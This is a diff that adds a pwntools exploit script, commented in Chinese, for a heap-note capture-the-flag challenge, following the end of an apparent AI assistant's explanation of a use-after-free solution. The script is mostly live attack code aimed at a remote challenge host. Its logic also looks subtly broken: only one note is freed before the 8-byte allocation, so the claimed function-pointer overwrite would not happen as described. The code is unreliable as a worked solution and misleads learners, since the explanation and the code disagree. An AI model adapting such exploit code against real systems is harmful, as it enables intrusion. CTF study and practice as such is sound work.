@@ -67,3 +67,41 @@ AIMessage(content="To solve this challenge using pwntools, we can exploit a Use-
  'and overwriting the function pointer in the freed note structure. When '
  '`print_note` is called on the freed note, it uses the overwritten function '
  'pointer to call `magic()`, which prints the flag.')
+
+from pwn import *
+
+# 启动进程或远程连接
+# p = process('./vulnerable_binary')  # 如果本地运行，请取消注释
+p = remote('chall.pwnable.tw', 10102)  # 替换为实际的主机和端口
+
+# 地址（从反编译代码中获取）
+magic_addr = 0x08048986  # `magic()`函数的地址
+
+def add_note(size, content):
+    p.sendlineafter('Your choice :', '1')
+    p.sendlineafter('Note size :', str(size))
+    p.sendlineafter('Content :', content)
+
+def delete_note(index):
+    p.sendlineafter('Your choice :', '2')
+    p.sendlineafter('Index :', str(index))
+
+def print_note(index):
+    p.sendlineafter('Your choice :', '3')
+    p.sendlineafter('Index :', str(index))
+
+# 步骤1：添加Note 0
+add_note(16, b'Note 0 Content')
+
+# 步骤2：删除Note 0
+delete_note(0)
+
+# 步骤3：添加Note 1，大小为8字节，以覆盖Note 0的已释放结构
+# 这将分配一个复用Note 0已释放note结构的chunk
+add_note(8, p32(magic_addr))
+
+# 步骤4：打印Note 0以调用`magic()`
+print_note(0)
+
+# 与进程交互以接收标志
+p.interactive()
